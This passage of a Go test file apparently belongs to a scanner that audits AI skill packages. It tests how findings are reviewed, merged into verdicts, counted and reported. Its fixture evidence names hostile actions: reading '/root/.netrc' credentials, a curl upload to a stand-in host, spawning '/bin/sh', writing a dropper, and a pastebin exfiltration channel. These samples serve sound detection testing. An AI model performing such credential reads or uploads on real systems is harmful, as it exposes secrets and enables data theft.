		t.Fatalf("expected prompt summary and remediation focus, got %+v", marked[0])
	}
}

func TestBuildReviewAgentTasksPackagesVulnReviewPrompt(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:                  "SF-001",
			RuleID:              "V7-009",
			Title:               "命令执行",
			Severity:            "高风险",
			Category:            "命令执行",
			Confidence:          "高",
			AttackPath:          "下载后执行",
			Evidence:            []string{"scripts/run.py:10"},
			ChainSummaries:      []string{"时序告警: 命中下载后执行时序"},
			Chains:              []review.FindingChain{{Kind: "sequence_alert", Summary: "命中下载后执行时序"}, {Kind: "behavior_chain", Summary: "scripts/run.py:10-12 | 下载=1, 执行=1", Source: "scripts/run.py:10-12"}},
			FalsePositiveChecks: []string{"确认相关脚本不会进入发布包或动态加载链路"},
		}},
		RuleExplanations:     []review.RuleExplanation{{RuleID: "V7-009", DetectionCriteria: []string{"命令拼接"}, ExclusionConditions: []string{"固定参数不报"}, VerificationRequirements: []string{"确认入口可达"}, OutputRequirements: []string{"输出 JSON"}}},
		FalsePositiveReviews: []review.FalsePositiveReview{{FindingID: "SF-001", Verdict: "倾向真实风险", EvidenceStrength: "强", ExclusionChecks: []string{"确认相关脚本不会进入发布包或动态加载链路"}}},
		VulnerabilityBlocks:  []review.VulnerabilityBlock{{ID: "SF-001", Content: "<vuln><title>命令执行</title></vuln>"}},
	}
	tasks := buildReviewAgentTasks(refined)

	if len(tasks) != 1 {
		t.Fatalf("expected one review agent task, got %+v", tasks)
	}
	task := tasks[0]
	joined := task.AgentRole + task.Objective + task.Prompt + strings.Join(task.ExpectedOutputs, "\n") + strings.Join(task.Inputs, "\n")
	for _, want := range []string{"vuln-reviewer", "零误报", "<vuln>", "固定参数不报", "confirmed|likely_false_positive|needs_manual_review", "finding_chains:SF-001", "Chains: sequence_alert: 命中下载后执行时序", "behavior_chain: scripts/run.py:10-12 | 下载=1, 执行=1 [source=scripts/run.py:10-12]"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("expected review agent task contains %q, got %+v", want, task)
		}
	}
}

func TestExecuteDeterministicReviewAgentProducesThreeVerdicts(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{
			{ID: "SF-001", RuleID: "V7-009", Title: "命令执行", Severity: "高风险", Category: "命令执行", Confidence: "高", AttackPath: "下载后执行", Evidence: []string{"scripts/run.py:10"}, CalibrationBasis: []string{"高危时序"}, ReviewGuidance: "移除 shell 拼接"},
			{ID: "SF-002", RuleID: "V7-003", Title: "示例外联", Severity: "中风险", Category: "外联与情报", Confidence: "待复核", AttackPath: "example request", Evidence: []string{"examples/demo.py:1"}, ReviewGuidance: "确认是否发布"},
			{ID: "SF-003", RuleID: "V7-004", Title: "凭据访问", Severity: "中风险", Category: "凭据访问", Confidence: "待复核", ReviewGuidance: "补齐证据"},
		},
		FalsePositiveReviews: []review.FalsePositiveReview{
			{FindingID: "SF-001", Verdict: "倾向真实风险", EvidenceStrength: "强", ReachabilityChecks: []string{"入口可达"}},
			{FindingID: "SF-002", Verdict: "疑似误报", EvidenceStrength: "弱", ReachabilityChecks: []string{"已确认示例文件不会进入发布包"}},
			{FindingID: "SF-003", Verdict: "待人工复核", EvidenceStrength: "弱"},
		},
	}
	refined.ReviewAgentTasks = buildReviewAgentTasks(refined)
	verdicts, stats := executeDeterministicReviewAgentWithStats(refined)

	if len(verdicts) != 3 {
		t.Fatalf("expected three verdicts, got %+v", verdicts)
	}
	if stats.Reviewer != "deterministic-vuln-reviewer" || stats.TaskCount != 3 || stats.WorkerCount == 0 || stats.MaxConcurrency == 0 {
		t.Fatalf("expected deterministic reviewer stats, got %+v", stats)
	}
	want := map[string]string{"SF-001": "confirmed", "SF-002": "likely_false_positive", "SF-003": "needs_manual_review"}
	for _, verdict := range verdicts {
		if verdict.Verdict != want[verdict.FindingID] {
			t.Fatalf("unexpected verdict for %s: %+v", verdict.FindingID, verdict)
		}
		if verdict.Reviewer != "deterministic-vuln-reviewer" || len(verdict.StandardsApplied) == 0 {
			t.Fatalf("expected reviewer metadata, got %+v", verdict)
		}
	}
}

func TestDeterministicVerdictIgnoresUnrelatedBehaviorSupport(t *testing.T) {
	finding := review.StructuredFinding{ID: "SF-001", RuleID: "V7-006", Title: "凭据访问", Severity: "中风险", Category: "凭据访问", Confidence: "高", AttackPath: "读取凭据文件", Evidence: []string{"auth.py:8"}, ReviewGuidance: "限制凭据读取"}
	fp := review.FalsePositiveReview{FindingID: "SF-001", Verdict: "待人工复核", EvidenceStrength: "中: 有定位或校准依据，但仍需补充入口可达性。", ReachabilityChecks: []string{"确认风险代码所在文件是否属于技能发布包和主执行路径。"}}
	verdict := deterministicVerdictForTask(review.ReviewAgentTask{FindingID: "SF-001"}, finding, fp, review.Result{Behavior: review.BehaviorProfile{
		BehaviorChains: []string{"scripts/run.py:10-12 | 下载=1, 落地=0, 执行=1, 外联=0, 持久化=0, 提权=0, 凭据访问=0, 防御规避=0, 横向移动=0, 收集打包=0, C2信标=0"},
		SequenceAlerts: []string{"命中下载后执行时序"},
	}})
	if verdict.Verdict != "needs_manual_review" {
		t.Fatalf("expected unrelated behavior support not to confirm risk, got %+v", verdict)
	}
	if !slices.Contains(verdict.MissingEvidence, "缺少多源行为证据或高危时序印证") {
		t.Fatalf("expected missing related behavior evidence, got %+v", verdict)
	}
}

func TestReachabilityChecksUseRelatedBehaviorSupport(t *testing.T) {
	checks := reachabilityChecksForFinding(review.StructuredFinding{Category: "凭据访问"}, review.Result{Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中凭据访问后外联时序"}}})
	joined := strings.Join(checks, "\n")
	if !strings.Contains(joined, "与当前风险相关") {
		t.Fatalf("expected related behavior wording in reachability checks, got %+v", checks)
	}
	if strings.Contains(joined, "未记录对应时序") {
		t.Fatalf("expected related behavior support to avoid generic missing-timeline wording, got %+v", checks)
	}
}

func TestExecuteLLMReviewAgentProducesVerdictsAndMergeUsesConservativeFallback(t *testing.T) {
	refined := review.Result{ReviewAgentTasks: []review.ReviewAgentTask{
		{FindingID: "SF-001", Objective: "复核命令执行", Prompt: "prompt-1", StrictStandards: []string{"零误报"}},
		{FindingID: "SF-002", Objective: "复核示例外联", Prompt: "prompt-2", StrictStandards: []string{"排除示例"}},
	}}
	client := &fakeLLMReviewClient{results: map[string]*llm.AnalysisResult{
		"漏洞二次复核 SF-001": {IntentRiskLevel: "high", IntentMismatch: "存在真实命令执行", Risks: []llm.RiskItem{{Severity: "high", Description: "移除命令拼接"}}},
		"漏洞二次复核 SF-002": {IntentRiskLevel: "low", IntentConsistency: 95, ConsistencyEvidence: []string{"已确认示例文件不会进入发布包"}},
	}}

	llmVerdicts, stats, err := executeLLMReviewAgentWithStats(context.Background(), client, refined)
	if err != nil {
		t.Fatalf("execute llm reviewer: %v", err)
	}
	if len(llmVerdicts) != 2 || len(client.calls) != 2 {
		t.Fatalf("expected two llm verdicts and calls, got verdicts=%+v calls=%+v", llmVerdicts, client.calls)
	}
	if stats.Reviewer != "llm-vuln-reviewer" || stats.TaskCount != 2 || stats.WorkerCount == 0 || stats.MaxConcurrency == 0 {
		t.Fatalf("expected llm reviewer stats, got %+v", stats)
	}
	if llmVerdicts[0].Verdict != "confirmed" || llmVerdicts[0].Reviewer != "llm-vuln-reviewer" {
		t.Fatalf("expected confirmed llm verdict, got %+v", llmVerdicts[0])
	}
	if llmVerdicts[1].Verdict != "likely_false_positive" {
		t.Fatalf("expected likely false positive, got %+v", llmVerdicts[1])
	}

	merged := mergeReviewAgentVerdicts([]review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "needs_manual_review", Reviewer: "deterministic-vuln-reviewer"}}, llmVerdicts[:1])
	preferred := preferredVerdictsByFinding(merged)
	if preferred["SF-001"].Verdict != "needs_manual_review" || !strings.Contains(preferred["SF-001"].Reviewer, "deterministic-vuln-reviewer") || !strings.Contains(preferred["SF-001"].Reviewer, "llm-vuln-reviewer") {
		t.Fatalf("expected conflicting verdicts to fall back to manual review, got %+v", preferred["SF-001"])
	}
}

func TestExecuteLLMReviewAgentRunsTasksInParallelAndKeepsOrder(t *testing.T) {
	refined := review.Result{ReviewAgentTasks: []review.ReviewAgentTask{
		{FindingID: "SF-001", Objective: "复核命令执行", Prompt: "prompt-1", StrictStandards: []string{"零误报"}},
		{FindingID: "SF-002", Objective: "复核示例外联", Prompt: "prompt-2", StrictStandards: []string{"排除示例"}},
		{FindingID: "SF-003", Objective: "复核凭据访问", Prompt: "prompt-3", StrictStandards: []string{"入口可达性"}},
	}}
	client := &fakeLLMReviewClient{
		delay: 40 * time.Millisecond,
		results: map[string]*llm.AnalysisResult{
			"漏洞二次复核 SF-001": {IntentRiskLevel: "high", IntentMismatch: "存在真实命令执行", Risks: []llm.RiskItem{{Severity: "high", Description: "移除命令拼接"}}},
			"漏洞二次复核 SF-002": {IntentRiskLevel: "low", IntentConsistency: 95, ConsistencyEvidence: []string{"示例不会进入发布包"}},
			"漏洞二次复核 SF-003": {IntentRiskLevel: "medium", IntentMismatch: "存在凭据访问风险", Risks: []llm.RiskItem{{Severity: "medium", Description: "收紧凭据读取范围"}}},
		},
	}

	start := time.Now()
	verdicts, stats, err := executeLLMReviewAgentWithStats(context.Background(), client, refined)
	if err != nil {
		t.Fatalf("execute llm reviewer in parallel: %v", err)
	}
	if len(verdicts) != 3 {
		t.Fatalf("expected three verdicts, got %+v", verdicts)
	}
	if verdicts[0].FindingID != "SF-001" || verdicts[1].FindingID != "SF-002" || verdicts[2].FindingID != "SF-003" {
		t.Fatalf("expected verdict order to stay aligned with tasks, got %+v", verdicts)
	}
	if client.maxConcurrent < 2 {
		t.Fatalf("expected parallel llm execution, got max concurrency %d", client.maxConcurrent)
	}
	if stats.MaxConcurrency < 2 || stats.WorkerCount < 2 {
		t.Fatalf("expected llm stats capture concurrency, got %+v", stats)
	}
	if elapsed := time.Since(start); elapsed >= 100*time.Millisecond {
		t.Fatalf("expected parallel execution to finish faster than near-serial runtime, took %s", elapsed)
	}
}

func TestStructuredFindingSourceLabelsRequireActualSandboxEvidence(t *testing.T) {
	staticOnly := structuredFindingSourceLabels(review.StructuredFinding{
		ID:               "SF-001",
		Title:            "命令执行",
		Source:           "Static",
		CalibrationBasis: []string{"存在高危时序告警，可支持攻击路径成立性复核"},
		Evidence:         []string{"scripts/run.py:10 | os.system(cmd)"},
	}, "", 0)
	if containsString(staticOnly, "沙箱动态") {
		t.Fatalf("expected static finding with sequence basis not labeled as sandbox dynamic, got %+v", staticOnly)
	}

	withSandboxEvidence := structuredFindingSourceLabels(review.StructuredFinding{
		ID:               "SF-002",
		Title:            "命令执行",
		Source:           "BehaviorGuard",
		CalibrationBasis: []string{"沙箱已记录高危时序，可支持攻击路径成立性复核"},
		Evidence:         []string{"[sandbox] scripts/run.py:10 | exec.Command('/bin/sh')"},
	}, "", 0)
	if !containsString(withSandboxEvidence, "沙箱动态") {
		t.Fatalf("expected finding with sandbox evidence labeled as sandbox dynamic, got %+v", withSandboxEvidence)
	}
}

func TestPreferredVerdictsByFindingUsesConsensusBeforeReviewerPriority(t *testing.T) {
	preferred := preferredVerdictsByFinding([]review.ReviewAgentVerdict{
		{FindingID: "SF-001", Verdict: "confirmed", Confidence: "高", Reviewer: "llm-vuln-reviewer", MissingEvidence: []string{"缺少运行证据"}},
		{FindingID: "SF-001", Verdict: "likely_false_positive", Confidence: "中高", Reviewer: "deterministic-vuln-reviewer", StandardsApplied: []string{"入口可达性"}},
	})
	got := preferred["SF-001"]
	if got.Verdict != "needs_manual_review" {
		t.Fatalf("expected conflicting verdict to degrade to manual review, got %+v", got)
	}
	if got.Confidence != "低" {
		t.Fatalf("expected low confidence on conflict, got %+v", got)
	}
	if !strings.Contains(got.Reviewer, "deterministic-vuln-reviewer") || !strings.Contains(got.Reviewer, "llm-vuln-reviewer") {
		t.Fatalf("expected merged reviewer source, got %+v", got)
	}
	if len(got.MissingEvidence) == 0 || len(got.StandardsApplied) == 0 {
		t.Fatalf("expected merged conflict context, got %+v", got)
	}
}

func TestReviewedRiskCountsAndSortingUseReviewerVerdicts(t *testing.T) {
	findings := []plugins.Finding{
		{RuleID: "V7-003", Severity: "高风险", Title: "疑似示例外联"},
		{RuleID: "V7-009", Severity: "中风险", Title: "确认命令执行"},
		{RuleID: "V7-004", Severity: "高风险", Title: "待复核凭据访问"},
	}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{
			{ID: "SF-001", RuleID: "V7-003", Severity: "高风险", Title: "疑似示例外联", Evidence: []string{"README.md:12 示例外联 https://example.com"}},
			{ID: "SF-002", RuleID: "V7-009", Severity: "中风险", Title: "确认命令执行", Category: "命令执行", Confidence: "高", Evidence: []string{"scripts/run.py:10 exec.Command(payload)", "scripts/run.py:12 subprocess.run(payload)"}, CalibrationBasis: []string{"存在高危时序告警"}},
			{ID: "SF-003", RuleID: "V7-004", Severity: "高风险", Title: "待复核凭据访问", Category: "凭据访问", Evidence: []string{"auth.py:8 open('/root/.netrc')"}},
		},
		Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中下载后执行时序", "命中凭据访问后外联时序"}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{
			{FindingID: "SF-001", Verdict: "likely_false_positive", Reviewer: "llm-vuln-reviewer"},
			{FindingID: "SF-002", Verdict: "confirmed", Reviewer: "deterministic-vuln-reviewer"},
			{FindingID: "SF-003", Verdict: "needs_manual_review", Reviewer: "llm-vuln-reviewer"},
		},
	}

	high, medium, low := countReviewedFindingRisks(findings, refined)
	if high != 0 || medium != 2 || low != 1 {
		t.Fatalf("expected reviewer-adjusted counts 0/2/1, got %d/%d/%d", high, medium, low)
	}
	ordered := sortFindingsByReview(findings, refined)
	if ordered[0].RuleID != "V7-009" || ordered[1].RuleID != "V7-004" || ordered[2].RuleID != "V7-003" {
		t.Fatalf("expected confirmed, manual, false-positive order, got %+v", ordered)
	}
	if got := finalReviewSummaryForFinding(findings[0], refined); !strings.Contains(got, "疑似误报") || !strings.Contains(got, "语义复核器") {
		t.Fatalf("expected final review summary, got %q", got)
	}
}

func TestCountReviewedFindingRisksDowngradesDocumentationOnlyFalsePositive(t *testing.T) {
	findings := []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "示例外联"}}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:       "SF-001",
			RuleID:   "V7-003",
			Severity: "高风险",
			Title:    "示例外联",
			Evidence: []string{"README.md:12 示例请求 https://example.com"},
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "likely_false_positive", Reviewer: "llm-vuln-reviewer"}},
	}
	high, medium, low := countReviewedFindingRisks(findings, refined)
	if high != 0 || medium != 0 || low != 1 {
		t.Fatalf("expected documentation-only false positive downgraded to low, got %d/%d/%d", high, medium, low)
	}
}

func TestCountReviewedFindingRisksKeepsStrongConfirmedHighRisk(t *testing.T) {
	findings := []plugins.Finding{{RuleID: "V7-009", Severity: "高风险", Title: "命令执行"}}
	refined := review.Result{
		Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中下载后执行时序"}},
		StructuredFindings: []review.StructuredFinding{{
			ID:               "SF-001",
			RuleID:           "V7-009",
			Severity:         "高风险",
			Title:            "命令执行",
			Category:         "命令执行",
			Confidence:       "高",
			Evidence:         []string{"scripts/run.py:10 exec.Command(payload)", "scripts/run.py:12 os.WriteFile(dropper)"},
			CalibrationBasis: []string{"存在高危时序告警"},
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "confirmed", Reviewer: "deterministic-vuln-reviewer"}},
	}
	high, medium, low := countReviewedFindingRisks(findings, refined)
	if high != 1 || medium != 0 || low != 0 {
		t.Fatalf("expected strong confirmed finding remain high, got %d/%d/%d", high, medium, low)
	}
}

func TestDeterministicVerdictConfirmsPolicyTIFindingWithoutAttackChain(t *testing.T) {
	finding := review.StructuredFinding{
		ID:             "SF-001",
		RuleID:         "V7-003",
		Title:          "公司策略禁止的加密资产或预测市场目标",
		Severity:       "中风险",
		Category:       "外联与情报",
		Confidence:     "中",
		AttackPath:     "访问策略禁止目标",
		Evidence:       []string{"目标证据: https://clob.polymarket.com\n判定依据: 命中公司准入策略禁止的加密资产或预测市场相关目标"},
		ReviewGuidance: "替换为合规目标",
	}
	fp := review.FalsePositiveReview{FindingID: "SF-001", Verdict: "待人工复核", EvidenceStrength: "中: 有定位或校准依据，但仍需补充入口可达性。", ReachabilityChecks: []string{"确认风险代码所在文件是否属于技能发布包和主执行路径。"}}
	verdict := deterministicVerdictForTask(review.ReviewAgentTask{FindingID: "SF-001"}, finding, fp, review.Result{TIReputations: []review.TIReputation{{Target: "https://clob.polymarket.com", Reputation: "policy", Confidence: 0.9}}})
	if verdict.Verdict != "confirmed" {
		t.Fatalf("expected policy TI finding to be confirmed as policy issue, got %+v", verdict)
	}
	if verdict.Confidence != "中高" {
		t.Fatalf("expected policy TI finding confidence to be medium-high, got %+v", verdict)
	}
}

func TestDeterministicVerdictDowngradesDocumentationOnlyFinding(t *testing.T) {
	finding := review.StructuredFinding{
		ID:         "SF-001",
		RuleID:     "V7-015",
		Title:      "说明文档中的远程执行描述",
		Severity:   "中风险",
		Category:   "声明与行为差异",
		AttackPath: "docs note",
		Evidence:   []string{"docs/guide.md:8 tool supports remote execution"},
	}
	fp := review.FalsePositiveReview{FindingID: "SF-001", Verdict: "待人工复核", EvidenceStrength: "弱: 证据不足，应优先人工复核并补充运行链路。", ReachabilityChecks: []string{"确认风险代码所在文件是否属于技能发布包和主执行路径。"}}
	verdict := deterministicVerdictForTask(review.ReviewAgentTask{FindingID: "SF-001"}, finding, fp, review.Result{})
	if verdict.Verdict != "likely_false_positive" {
		t.Fatalf("expected documentation-only finding downgraded, got %+v", verdict)
	}
}

func TestDeterministicVerdictDowngradesInternalDevelopmentFinding(t *testing.T) {
	finding := review.StructuredFinding{
		ID:         "SF-001",
		RuleID:     "V7-003",
		Title:      "本地开发回调地址",
		Severity:   "中风险",
		Category:   "外联与情报",
		AttackPath: "dev callback",
		Evidence:   []string{"config/dev.yaml:8 callback=http://localhost:3000/api"},
	}
	fp := review.FalsePositiveReview{FindingID: "SF-001", Verdict: "待人工复核", EvidenceStrength: "弱: 证据不足，应优先人工复核并补充运行链路。", ReachabilityChecks: []string{"确认风险代码所在文件是否属于技能发布包和主执行路径。"}}
	verdict := deterministicVerdictForTask(review.ReviewAgentTask{FindingID: "SF-001"}, finding, fp, review.Result{})
	if verdict.Verdict != "likely_false_positive" {
		t.Fatalf("expected internal-development finding downgraded, got %+v", verdict)
	}
}

func TestDeterministicVerdictConfirmsModerateEvidenceWithRelatedBehavior(t *testing.T) {
	finding := review.StructuredFinding{
		ID:               "SF-001",
		RuleID:           "V7-004",
		Title:            "凭据访问",
		Severity:         "高风险",
		Category:         "凭据访问",
		AttackPath:       "读取凭据后外联",
		Evidence:         []string{"auth.py:8 open('/root/.netrc')"},
		CalibrationBasis: []string{"存在与当前风险相关的高危时序告警"},
	}
	fp := review.FalsePositiveReview{FindingID: "SF-001", Verdict: "待人工复核", EvidenceStrength: "中: 有定位或校准依据，但仍需补充入口可达性。", ReachabilityChecks: []string{"确认风险代码所在文件是否属于技能发布包和主执行路径。"}}
	verdict := deterministicVerdictForTask(review.ReviewAgentTask{FindingID: "SF-001"}, finding, fp, review.Result{Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中凭据访问后外联时序"}}})
	if verdict.Verdict != "confirmed" {
		t.Fatalf("expected moderate evidence with related behavior to be confirmed, got %+v", verdict)
	}
	if verdict.Confidence != "中高" {
		t.Fatalf("expected medium-high confidence, got %+v", verdict)
	}
}

func TestSynthesizeTIFindingsSeparatesPolicyAndThreat(t *testing.T) {
	findings := synthesizeTIFindings([]review.TIReputation{
		{Target: "https://clob.polymarket.com", Reputation: "policy", Reason: "命中公司准入策略禁止的加密资产或预测市场相关目标"},
		{Target: "https://pastebin.com/raw/abc", Reputation: "suspicious", Reason: "疑似数据外传通道"},
		{Target: "http://localhost:3000", Reputation: "internal", Reason: "本地环回目标"},
	})
	if len(findings) != 2 {
		t.Fatalf("expected only policy and threat findings, got %+v", findings)
	}
	if findings[0].Severity != "中风险" || findings[0].Title != "公司策略禁止的加密资产或预测市场目标" {
		t.Fatalf("expected policy TI finding to stay medium policy issue, got %+v", findings[0])
	}
	if findings[1].Severity != "高风险" || findings[1].Title != "敏感数据外发与隐蔽通道" {
		t.Fatalf("expected suspicious TI finding to stay high threat issue, got %+v", findings[1])
	}
}

func TestBuildHTMLReportStillShowsCommandExecutionCapabilityAndEvidenceAfterRefactor(t *testing.T) {
	base := baseScanOutput{}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:             "SF-001",
			RuleID:         "V7-009",
			Title:          "命令执行",
			Severity:       "高风险",
			Category:       "命令执行",
			Confidence:     "高",
			AttackPath:     "scripts/run.py:20 | shell 执行",
			Evidence:       []string{"scripts/run.py:20 os.system(cmd)"},
			ChainSummaries: []string{"行为链: scripts/run.py:18-20 | 执行=1"},
			ReviewGuidance: "移除 shell 执行并收敛命令来源",
			Source:         "static-rule",
		}},
		RuleExplanations:     []review.RuleExplanation{{RuleID: "V7-009", RemediationFocus: "移除 shell 与子进程执行"}},
		FalsePositiveReviews: []review.FalsePositiveReview{{FindingID: "SF-001", Verdict: "倾向真实风险"}},
		CapabilityMatrix: []review.CapabilityConsistency{{
			Capability:     "命令执行",
			StaticDetected: true,
			Status:         "已检测到相关能力",
			Evidence:       []string{"规则证据: V7-009 命令执行"},
			NextStep:       "移除 shell 执行入口",
		}},
		EvidenceInventory: []review.EvidenceInventory{{Category: "执行行为", Count: 1, Examples: []string{"scripts/run.py:20 os.system(cmd)"}, Meaning: "用于确认技能是否调用系统命令或解释器"}},
		Behavior:          review.BehaviorProfile{ExecuteIOCs: []string{"scripts/run.py:20 os.system(cmd)"}, BehaviorChains: []string{"scripts/run.py:18-20 | 下载=0, 落地=0, 执行=1, 外联=0, 持久化=0, 提权=0, 凭据访问=0, 防御规避=0, 横向移动=0, 收集打包=0, C2信标=0"}},
	}
	html := buildHTMLReport("demo.zip", "", []plugins.Finding{{RuleID: "V7-009", Severity: "高风险", Title: "命令执行"}}, base, refined, nil)
	sectionStart := strings.Index(html, "<strong>SF-001 / 命令执行</strong>")
	if sectionStart == -1 {
		t.Fatalf("expected command finding section in html, got %q", html)
	}
	section := html[sectionStart : strings.Index(html[sectionStart:], "</details>")+sectionStart]
	for _, want := range []string{"命令执行", "对应证据: 规则证据: V7-009 命令执行", "scripts/run.py:20 os.system(cmd)", "对应修复建议: 移除 shell 执行并收敛命令来源"} {
		if !strings.Contains(section, want) {
			t.Fatalf("expected command-exec evidence preserved after refactor, missing %q in %q", want, section)
		}
	}
}

func TestCountReviewedFindingRisksEvidenceRegressionSamples(t *testing.T) {
	tests := []struct {
		name         string
		findings     []plugins.Finding
		refined      review.Result
		wantHigh     int
		wantMedium   int
		wantLow      int
		wantDecision string
	}{
		{
			name:     "文档型示例误报降为低风险",
			findings: []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "README 外联示例"}},
			refined: review.Result{
				StructuredFindings: []review.StructuredFinding{{
					ID:       "SF-001",
					RuleID:   "V7-003",
					Severity: "高风险",
					Title:    "README 外联示例",
					Evidence: []string{"README.md:18 curl https://example.com/upload"},
				}},
				ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "likely_false_positive"}},
			},
			wantHigh: 0, wantMedium: 0, wantLow: 1, wantDecision: "low",
		},
		{
			name:     "弱证据中风险降为低风险",
			findings: []plugins.Finding{{RuleID: "V7-015", Severity: "中风险", Title: "描述性配置提示"}},
			refined: review.Result{
				StructuredFindings: []review.StructuredFinding{{
					ID:       "SF-002",
					RuleID:   "V7-015",
					Severity: "中风险",
					Title:    "描述性配置提示",
					Evidence: []string{"docs/example.md:8 tool supports remote execution"},
				}},
				ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-002", Verdict: "needs_manual_review"}},
			},
			wantHigh: 0, wantMedium: 0, wantLow: 1, wantDecision: "low",
		},
		{
			name:     "强证据命令执行维持高风险",
			findings: []plugins.Finding{{RuleID: "V7-009", Severity: "高风险", Title: "命令执行"}},
			refined: review.Result{
				Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中下载后执行时序"}},
				StructuredFindings: []review.StructuredFinding{{
					ID:               "SF-003",
					RuleID:           "V7-009",
					Severity:         "高风险",
					Title:            "命令执行",
					Category:         "命令执行",
					Confidence:       "高",
					Evidence:         []string{"scripts/run.py:10 exec.Command(payload)", "scripts/run.py:12 os.WriteFile(dropper)"},
					CalibrationBasis: []string{"存在高危时序告警"},
				}},
				ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-003", Verdict: "confirmed"}},
			},
			wantHigh: 1, wantMedium: 0, wantLow: 0, wantDecision: "high",
		},
		{
			name:     "高风险但证据一般回落到中风险",
			findings: []plugins.Finding{{RuleID: "V7-004", Severity: "高风险", Title: "凭据访问"}},
			refined: review.Result{
				Behavior: review.BehaviorProfile{SequenceAlerts: []string{"命中凭据访问后外联时序"}},
				StructuredFindings: []review.StructuredFinding{{
					ID:       "SF-004",
					RuleID:   "V7-004",
					Severity: "高风险",
					Title:    "凭据访问",
					Category: "凭据访问",
					Evidence: []string{"auth.py:8 open('/root/.netrc')"},
				}},
				ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-004", Verdict: "needs_manual_review"}},
			},
			wantHigh: 0, wantMedium: 1, wantLow: 0, wantDecision: "medium",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			high, medium, low := countReviewedFindingRisks(tc.findings, tc.refined)
			if high != tc.wantHigh || medium != tc.wantMedium || low != tc.wantLow {
				t.Fatalf("expected %d/%d/%d, got %d/%d/%d", tc.wantHigh, tc.wantMedium, tc.wantLow, high, medium, low)
			}
			risk, _ := decisionFromReviewedFindings(baseScanOutput{}, tc.refined)
			if risk != tc.wantDecision {
				t.Fatalf("expected decision %s, got %s", tc.wantDecision, risk)
			}
		})
	}
}

func TestDocumentationOnlyFindingWithRealisticFixtureTreeDowngradesToLow(t *testing.T) {
	dir := createRealisticSkillFixtureTree(t)
	findings := []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "README 外联示例"}}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:       "SF-REALDOC-001",
			RuleID:   "V7-003",
			Severity: "高风险",
			Title:    "README 外联示例",
			Evidence: []string{
				filepath.Join(dir, "README.md") + ":12 curl https://example.com/upload",
				filepath.Join(dir, "docs", "guide.md") + ":8 requests.post('https://example.com/api')",
			},
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-REALDOC-001", Verdict: "likely_false_positive"}},
	}
	high, medium, low := countReviewedFindingRisks(findings, refined)
	if high != 0 || medium != 0 || low != 1 {
		t.Fatalf("expected realistic documentation-only fixture downgraded to low, got %d/%d/%d", high, medium, low)
	}
	risk, _ := decisionFromReviewedFindings(baseScanOutput{}, refined)
	if risk != "low" {
		t.Fatalf("expected low decision for realistic documentation-only fixture, got %s", risk)
	}
}

func TestBuildAuditEventsCombinesTracePipelineAndWarnings(t *testing.T) {
	base := baseScanOutput{trace: []analysisTraceEvent{{Stage: "preflight", Status: "completed", Message: "自检通过"}}}
	refined := review.Result{
		Pipeline:           []review.PipelineStage{{Name: "sandbox_execute", Purpose: "执行沙箱", Status: "completed", Output: "完成", Benefit: "可解释"}},
		StructuredFindings: []review.StructuredFinding{{ID: "SF-001"}},
		CapabilityMatrix:   []review.CapabilityConsistency{{Capability: "外联/网络访问"}},
		EvidenceInventory:  []review.EvidenceInventory{{Category: "外联行为", Count: 1}},
		ReviewAgentStats:   []review.ReviewAgentExecutionStats{{Reviewer: "llm-vuln-reviewer", TaskCount: 3, WorkerCount: 3, MaxConcurrency: 2, DurationMs: 41}},
		Behavior:           review.BehaviorProfile{ProbeWarnings: []string{"静态发现外联但沙箱未检出"}},
	}
	events := buildAuditEvents(base, refined)

	if len(events) < 5 {
		t.Fatalf("expected multiple audit events, got %+v", events)
	}
	joined := ""
	for _, event := range events {
		joined += event.Type + " " + event.Brief + " " + event.Detail + "\n"
	}
	for _, want := range []string{"statusUpdate", "newPlanStep", "resultUpdate", "静态发现外联但沙箱未检出", "二次复核执行统计", "并发峰值 2"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("expected audit event %q in %+v", want, events)
		}
	}
}

func TestBuildCapabilityMatrixExposesSandboxGap(t *testing.T) {
	base := baseScanOutput{
		profile: skillAnalysisProfile{Permissions: []string{"network"}},
		intentSummary: intentReportSummary{
			Available:          true,
			ActualCapabilities: []string{"外联上传数据"},
		},
	}
	findings := []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "敏感数据外发与隐蔽通道", Description: "发现外联", CodeSnippet: "fetch(url)"}}
	matrix := buildCapabilityMatrix(findings, base, review.Result{})

	found := false
	for _, item := range matrix {
		if item.Capability == "外联/网络访问" {
			found = true
			if item.Status != "已声明但沙箱未验证" || item.Gap == "" || !item.StaticDetected || !item.LLMDetected {
				t.Fatalf("unexpected external capability row: %+v", item)
			}
		}
	}
	if !found {
		t.Fatalf("expected external capability row, got %+v", matrix)
	}
}

func TestBuildStructuredFindingsDeduplicatesAndAddsReviewContext(t *testing.T) {
	findings := []plugins.Finding{
		{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Description: "检测到 shell 执行", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"},
